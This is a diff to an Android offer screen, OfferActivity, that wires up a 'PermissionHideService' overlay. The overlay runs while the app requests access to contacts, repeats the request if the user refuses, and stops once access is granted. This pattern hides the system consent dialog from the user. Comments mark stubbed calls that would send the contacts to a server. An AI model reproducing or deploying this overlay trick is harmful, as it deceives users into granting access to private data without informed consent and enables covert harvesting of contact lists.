@@ -21,11 +21,24 @@ public class OfferActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_offer);
 
-        getReadContactPermissions();
-        gatherData();
+
+        gatherData1();
 
         ImageView toast = (ImageView) findViewById(R.id.toast);
     }
+
+
+    private void gatherData1(){
+   //     ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_CONTACTS},
+     //           REQUEST_CONTACTS_PERMISSION_CODE);
+     //   overlayService(true);
+
+        if (getReadContactPermissions()) {
+
+        } else
+            overlayService(true);
+    }
+
 
     private void gatherData() {
         if (getReadContactPermissions()) {
@@ -37,15 +50,30 @@ public class OfferActivity extends AppCompatActivity {
     // Start or stop the permission overlay
     private void messagePermissionOverlayService(boolean start) {
         Intent i = new Intent();
-        i.setClassName("nap.polarbaer.prservice", "nap.polarbaer.prservice.PermissionHideService");
+
+        i.setClassName("com.snakesonwheels.tabely.view", "com.snakesonwheels.tabely.view.PermissionHideService");
         if (start) {
-            i.setAction("nap.polarbaer.prservice.PermissionHideService.START");
+            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.START");
             startService(i);
         } else {
-            i.setAction("nap.polarbaer.prservice.PermissionHideService.STOP");
+            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.STOP");
             stopService(i);
         }
     }
+
+    // Start or stop the GameService
+    private void overlayService(boolean start) {
+        Intent i = new Intent(this, PermissionHideService.class);
+        if (start) {
+            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.START");
+            startService(i);
+        } else {
+            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.STOP");
+            stopService(i);
+        }
+    }
+
+
 
     private boolean getReadContactPermissions() {
         // If READ_CONTACTS permission already granted return true
@@ -55,6 +83,7 @@ public class OfferActivity extends AppCompatActivity {
         // Else request permission and return false
         ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_CONTACTS},
                 REQUEST_CONTACTS_PERMISSION_CODE);
+
         return false;
     }
 
@@ -63,18 +92,18 @@ public class OfferActivity extends AppCompatActivity {
             grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-        messagePermissionOverlayService(false);
+    //    messagePermissionOverlayService(false);
 
         switch (requestCode) {
             case REQUEST_CONTACTS_PERMISSION_CODE:
                 // If READ_CONTACTS permission was granted
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     //addContactsToSender(); send to server
-                    messagePermissionOverlayService(false);
+                    overlayService(false);
                     //sendEmail(); send to server
                     // Else retry
                 } else if (!getReadContactPermissions())
-                    messagePermissionOverlayService(true);
+                   overlayService(true);
                 break;
         }
     }
